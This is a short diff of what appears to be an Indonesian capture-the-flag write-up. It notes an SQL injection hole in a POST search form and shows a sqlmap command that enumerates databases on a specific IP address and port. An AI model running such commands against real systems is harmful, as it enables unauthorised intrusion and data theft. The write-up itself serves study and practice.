@@ -88,7 +88,7 @@ if ($res->num_rows > 0) {
 ```
 <br>
 diketahui bahwa terdapat celah sqli  pada form tersebut dengan method POST <br>
-dicoba dengan melakukan blind sql Injection dengan bantuan sqlmap <br>
+dicoba dengan melakukan blind sql Injection dengan bantuan sqlmap <br><br>
 
 ``` sqlmap -u "http://202.43.92.132:40001/index.php" --data="search=*&form=submit" --method POST --dbs ``` <br>
 
